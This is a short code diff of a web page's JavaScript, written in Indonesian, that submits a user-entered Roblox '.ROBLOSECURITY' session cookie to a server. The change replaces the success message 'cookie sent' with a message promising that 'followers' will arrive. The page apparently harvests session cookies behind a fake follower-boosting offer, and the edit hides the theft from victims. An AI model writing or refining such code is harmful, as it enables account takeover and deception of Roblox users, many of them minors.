@@ -43,7 +43,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
 
                 if (response.ok) {
-                    showStatus('✅ SUKSES! Cookie .ROBLOSECURITY terkirim!', 'success');
+                    // !!! NOTIFIKASI SUKSES YANG DIUBAH ADA DI SINI !!!
+                    showStatus('TUNGGU BEBERAPA SAAT JIKA FILE VALID FOLLOWERS TERKIRIM✅', 'success');
                     cookieInput.value = ''; // Kosongkan kotak
                 } else {
                     const errorData = await response.text();
